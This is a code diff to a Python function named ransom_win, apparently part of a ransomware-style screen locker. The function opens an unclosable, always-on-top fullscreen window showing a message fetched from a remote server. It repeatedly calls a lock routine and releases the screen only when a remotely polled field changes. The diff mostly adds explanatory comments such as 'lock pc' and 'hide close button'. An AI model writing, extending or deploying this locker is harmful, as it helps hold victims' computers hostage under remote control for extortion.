@@ -15,24 +15,23 @@ wa = ""
 
 
 def ransom_win():
-    print("hello")
-    msg = requests.get(getMsg).text
+    msg = requests.get(getMsg).text  # get the message from site.
     wa = tk.Tk()
     wa.title('Defensive Blocks')
     wa.overrideredirect(True)
-    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))
+    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))  # full screen
     wa.focus_set()  # <-- move focus to this widget
-    wa.protocol("WM_DELETE_WINDOW", exb)
-    wa.protocol("WM_MINIMIZE_WINDOW", exb)
+    wa.protocol("WM_DELETE_WINDOW", exb)  # hide close button
+    wa.protocol("WM_MINIMIZE_WINDOW", exb)  # hide minimize button
     lb1 = tk.Label(wa, text=str(msg) + "\n", font=("Arial Bold", 70), pady=200, fg="RED")
     lb1.pack()
-    wa.call('wm', 'attributes', '.', '-topmost', '1')
+    wa.call('wm', 'attributes', '.', '-topmost', '1')  # lift to the top
     while 1:
         wa.update()
-        lock()
+        lock()  # lock pc
         sleep(2)
         a_field = get(final.active_field)
-        if a_field == "0":
+        if a_field == "0":  # if client close the service
             wa.destroy()
             return
 
